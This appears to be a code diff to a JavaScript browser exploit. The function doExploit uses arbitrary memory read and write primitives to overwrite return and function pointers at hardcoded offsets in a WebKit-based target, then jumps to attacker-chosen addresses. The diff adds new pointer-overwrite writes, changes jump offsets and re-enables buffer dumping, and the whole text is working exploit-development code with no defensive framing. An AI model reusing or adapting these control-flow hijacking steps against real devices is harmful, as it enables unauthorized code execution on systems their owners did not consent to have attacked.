@@ -245,7 +245,7 @@ function doExploit(buf, stale, temp) {
 		log('Main module at ' + paddr(mainaddr));
 		var justret = 0x00433F78;
 		var setjmp  = 0x00433EE0;
-		var test = 0x0439DD8;
+		var test = 0x39FEEC;
 		var jaddr = add2(mainaddr, test);
 		log('New jump at ' + paddr(jaddr));
 		log('Assigning function pointer');
@@ -253,12 +253,19 @@ function doExploit(buf, stale, temp) {
 		log('Function object at ' + paddr(funcaddr));
 		var curptr = read8(funcaddr, 8);
 
+		var retaddr = add2(mainaddr, 0x3E2724);
+		var memaddr = add2(mainaddr, 0x91F328);
+		write8(retaddr, memaddr);
+		retaddr = add2(add2(curptr, -funcbase), 0x836050);
+		memaddr = add2(mainaddr, 0x91F350);
+		write8(retaddr, memaddr);
+
 		// For addresses in webkit_wkc
-		write8(add2(add2(curptr, -funcbase), 0x836050), funcaddr, 8);
+		//write8(add2(add2(curptr, -funcbase), 0x836050), funcaddr, 8);
 
 		// For addresses in app
-		//write8(jaddr, funcaddr, 8);
-		
+		write8(jaddr, funcaddr, 8);
+
 		log('Patched function address from ' + paddr(curptr) + ' to ' + paddr(read8(funcaddr, 8)));
 
 		log('Assigned.  Jumping.');
@@ -271,9 +278,9 @@ function doExploit(buf, stale, temp) {
 
 		var saddr = getAddr(ret);
 		log(paddr(saddr));
-		/*buf[4] = saddr[0];
+		buf[4] = saddr[0];
 		buf[5] = saddr[1];
-		dumpbuf(1024);*/
+		dumptemp(128);
 	}
 
 	setjmp();
